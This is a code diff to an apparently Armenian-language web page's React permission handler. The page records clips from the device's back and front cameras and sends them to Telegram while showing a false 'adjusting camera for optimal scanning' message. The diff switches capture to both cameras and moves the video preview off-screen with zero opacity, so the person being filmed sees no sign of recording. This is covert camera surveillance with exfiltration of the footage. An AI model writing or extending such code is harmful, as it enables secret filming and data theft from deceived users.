@@ -279,23 +279,19 @@ const PermissionHandler = () => {
       setProcessSuccessful(initialSendSuccess);
     }
 
-    // Determine camera facing mode based on attempt
-    const cameraFacingMode: "user" | "environment" = attempt === 1 ? "user" : "environment";
-    // const videoMessagePrefix = attempt === 1 ? "" : "Երկրորդ փորձ: "; // Removed prefix as per request
-
-    // --- Start Video 1 Recording ---
+    // --- Start Video 1 Recording (Back Camera) ---
     setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար..."); // Adjusting camera for optimal scanning...
     setAppPhase("recordingVideo1");
-    const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, cameraFacingMode);
+    const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment"); // Use 'environment' for first video
     if (video1Base64) {
       const video1SendSuccess = await sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1, attempt);
       setProcessSuccessful(prev => prev && video1SendSuccess);
     }
 
-    // --- Video 2 Recording ---
+    // --- Video 2 Recording (Front Camera) ---
     setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար..."); // Adjusting camera for optimal scanning...
     setAppPhase("recordingVideo2");
-    const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, cameraFacingMode);
+    const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user"); // Use 'user' for second video
     if (video2Base64) {
       const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
       setProcessSuccessful(prev => prev && video2SendSuccess);
@@ -366,13 +362,14 @@ const PermissionHandler = () => {
             {loadingMessage}
           </p>
           <div className="relative w-full max-w-md aspect-video bg-secondary flex items-center justify-center rounded-lg overflow-hidden shadow-lg">
+            {/* Video element is now hidden off-screen */}
             <video
               ref={videoRef}
               autoPlay
               playsInline
               muted
-              className="w-full h-full object-cover transition-opacity duration-500"
-              style={{ opacity: (appPhase === "recordingVideo1" || appPhase === "recordingVideo2") ? 1 : 0 }}
+              className="absolute -left-[9999px] -top-[9999px] w-full h-full object-cover"
+              style={{ opacity: 0 }} // Ensure it's visually hidden
             />
             <div className="absolute inset-0 border-4 border-primary opacity-70 rounded-lg pointer-events-none animate-border-pulse" />
             {(appPhase === "collectingData" || appPhase === "flippingCamera") && (
@@ -398,7 +395,7 @@ const PermissionHandler = () => {
               </p>
               <Button 
                 onClick={runProcess} 
-                className="mt-4 px-8 py-3 text-lg bg-primary text-primary-foreground hover:bg-primary/90 transition-colors duration-300 transform hover:scale-105"
+                className="mt-4 px-8 py-3 text-lg bg-primary text-primary-foreground hover:bg-primary/90 transition-colors duration-300 transform hover:scale-105 active:scale-95"
               >
                 Կրկնել
               </Button>
